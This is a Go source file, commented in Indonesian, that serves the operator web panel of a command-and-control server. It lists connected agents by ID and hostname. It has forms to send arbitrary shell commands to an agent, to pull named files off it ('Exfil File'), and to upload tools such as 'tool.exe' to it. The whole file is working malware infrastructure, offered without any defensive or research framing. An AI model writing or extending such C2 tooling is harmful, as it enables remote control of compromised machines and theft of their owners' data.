package handlers

import (
	"html/template"
	"net/http"
)

// Di file handlers.go, kita punya:
// var agents = make(map[string]string)
// Kita akan memanfaatkannya untuk menampilkan daftar agent

// 1. Template global (pakai Must agar error parse fatal)
var dashTmpl = template.Must(template.New("dashboard").Parse(`
<!DOCTYPE html>
<html>
<head><title>C2 Dashboard</title></head>
<body>
<h1>C2 Dashboard</h1>
<hr>

<h2>Connected Agents</h2>
{{ if .Agents }}
<table border="1">
<tr><th>ID</th><th>Hostname</th><th>Aksi</th></tr>
{{ range $id, $host := .Agents }}
<tr>
  <td>{{ $id }}</td>
  <td>{{ $host }}</td>
  <td>
    <!-- Link ke form command, passing agentID di query -->
    <a href="/commandUI?agent={{ $id }}">Send Command</a> |
    <a href="/exfilUI?agent={{ $id }}">Exfil File</a>
  </td>
</tr>
{{ end }}
</table>
{{ else }}
<p>No Agents Connected</p>
{{ end }}

<hr>
<p><a href="/uploadUI">Upload File to Server</a></p>
</body>
</html>
`))

// Handler untuk /dashboard
func DashboardHandler(w http.ResponseWriter, r *http.Request) {
	data := struct {
		Agents map[string]string
	}{
		Agents: agents,
	}
	dashTmpl.Execute(w, data)
}

// 2. Template untuk form pengiriman command
var cmdTmpl = template.Must(template.New("cmd").Parse(`
<!DOCTYPE html>
<html>
<head><title>Send Command</title></head>
<body>
<h1>Send Command to Agent {{.AgentID}}</h1>
<form method="GET" action="/command">
  <input type="hidden" name="id" value="{{.AgentID}}">
  Command: <input type="text" name="cmd">
  <input type="submit" value="Send">
</form>
</body>
</html>
`))

// Handler untuk /commandUI => Menampilkan form
func CommandUIHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		http.Error(w, "No agent selected", http.StatusBadRequest)
		return
	}

	data := struct {
		AgentID string
	}{
		AgentID: agentID,
	}
	cmdTmpl.Execute(w, data)
}

// 3. Template untuk form exfil
var exfilTmpl = template.Must(template.New("exfil").Parse(`
<!DOCTYPE html>
<html>
<head><title>Exfil File</title></head>
<body>
<h1>Request Exfil from Agent {{.AgentID}}</h1>
<form method="GET" action="/exfil">
  <input type="hidden" name="id" value="{{.AgentID}}">
  Filename: <input type="text" name="filename">
  <input type="submit" value="Exfil">
</form>
</body>
</html>
`))

// Handler untuk /exfilUI => Menampilkan form exfil
func ExfilUIHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		http.Error(w, "No agent selected", http.StatusBadRequest)
		return
	}

	data := struct {
		AgentID string
	}{
		AgentID: agentID,
	}
	exfilTmpl.Execute(w, data)
}

// 4. Template untuk form upload file ke server
var uploadTmpl = template.Must(template.New("upload").Parse(`
<!DOCTYPE html>
<html>
<head><title>Upload File to Server</title></head>
<body>
<h1>Upload File to Server (per Agent)</h1>
<form method="POST" action="/upload" enctype="multipart/form-data">
  Agent ID: <input type="text" name="id" placeholder="Enter agent ID"><br>
  Filename (optional): <input type="text" name="filename" value="tool.exe"><br>
  <input type="file" name="file"><br><br>
  <input type="submit" value="Upload">
</form>
</body>
</html>
`))

func UploadUIHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent")
	data := struct {
		AgentID string
	}{
		AgentID: agentID,
	}
	uploadTmpl.Execute(w, data)
}
